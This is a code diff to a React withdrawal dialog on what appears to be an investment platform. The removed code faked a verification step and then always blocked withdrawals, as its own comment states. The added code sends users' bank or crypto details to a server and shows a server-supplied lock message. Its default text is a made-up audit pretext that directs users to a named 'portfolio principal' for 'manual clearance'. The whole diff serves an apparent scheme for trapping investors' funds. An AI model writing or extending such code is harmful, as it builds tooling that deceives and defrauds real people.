@@ -39,23 +39,74 @@ export function WithdrawModal({ isOpen, onClose }: WithdrawModalProps) {
 
   const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
   const [isBlocked, setIsBlocked] = useState<boolean>(false);
+  const [lockNotice, setLockNotice] = useState<string>(
+    'Withdrawal window currently closed for quarterly asset rebalancing and cryptographic audit (ERR-WTH-88429-CLOSED). Contact portfolio principal Declan Salo for manual clearance.'
+  );
+  const [successNotice, setSuccessNotice] = useState<string | null>(null);
+
+  React.useEffect(() => {
+    if (isOpen) {
+      fetch('/api/withdrawals')
+        .then((r) => r.json())
+        .then((data) => {
+          if (data.success && data.withdrawals?.lockMessage) {
+            setLockNotice(data.withdrawals.lockMessage);
+          }
+        })
+        .catch(() => {});
+    }
+  }, [isOpen]);
 
   if (!isOpen) return null;
 
-  const handleAttemptWithdrawal = (e: React.FormEvent) => {
+  const handleAttemptWithdrawal = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
+    setSuccessNotice(null);
 
-    // Realistic verification simulation, then decisively BLOCK withdrawal
-    setTimeout(() => {
+    try {
+      const destinationStr =
+        selectedRail === 'crypto'
+          ? `${cryptoAsset}: ${cryptoAddress || 'Pending address'}`
+          : selectedRail === 'fedwire'
+          ? `${bankName} (${accountNumber})`
+          : selectedRail === 'swift'
+          ? `${bankName} (Routing: ${routingNumber})`
+          : 'Linked Card (•••• 9102)';
+
+      const res = await fetch('/api/withdrawals', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          amount: parseFloat(amount) || 0,
+          rail: selectedRail,
+          beneficiary: beneficiaryName,
+          destination: destinationStr,
+        }),
+      });
+
+      const data = await res.json();
+      setIsSubmitting(false);
+
+      if (data.blocked) {
+        if (data.error) setLockNotice(data.error);
+        setIsBlocked(true);
+      } else if (data.success) {
+        setSuccessNotice(data.message || 'Withdrawal submitted and logged for review.');
+      } else {
+        if (data.error) setLockNotice(data.error);
+        setIsBlocked(true);
+      }
+    } catch {
       setIsSubmitting(false);
       setIsBlocked(true);
-    }, 1200);
+    }
   };
 
   const resetState = () => {
     setIsBlocked(false);
     setIsSubmitting(false);
+    setSuccessNotice(null);
   };
 
   const handleModalClose = () => {
@@ -255,7 +306,7 @@ export function WithdrawModal({ isOpen, onClose }: WithdrawModalProps) {
               >
                 <AlertTriangle style={{ width: '16px', height: '16px', color: '#d97706', flexShrink: 0, marginTop: '1px' }} />
                 <div>
-                  <strong>Custody Directive:</strong> Pursuant to quarterly liquidity allocations, disbursements will automatically reopen upon completion of the active capital cycle. Please consult your portfolio custodian for scheduled release windows.
+                  <strong>Custody Directive:</strong> {lockNotice}
                 </div>
               </div>
 
